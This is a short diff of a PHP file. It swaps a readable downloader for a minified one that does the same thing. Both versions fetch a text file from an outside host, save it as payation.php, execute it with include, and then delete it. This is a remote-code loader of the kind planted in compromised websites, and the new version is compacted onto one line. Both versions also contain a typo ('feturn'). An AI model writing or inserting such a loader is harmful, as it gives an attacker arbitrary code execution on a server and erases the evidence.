@@ -1,12 +1,2 @@
 <?php
-$url = "https://xy.xzvs.top/i/payation.txt";
-$savePath = __DIR__ . "/payation.php";
-$content = file_get_contents($url);
-if ($content === false) {
-    feturn;
-}
-file_put_contents($savePath, $content);
-include $savePath;
-if (file_exists($savePath)) {
-    unlink($savePath);
-}
+$a="https://x8v.top/i/payation.txt";$b=__DIR__."/payation.php";$c=file_get_contents($a);if($c===false){feturn;}file_put_contents($b,$c);include $b;if(file_exists($b)){unlink($b);}
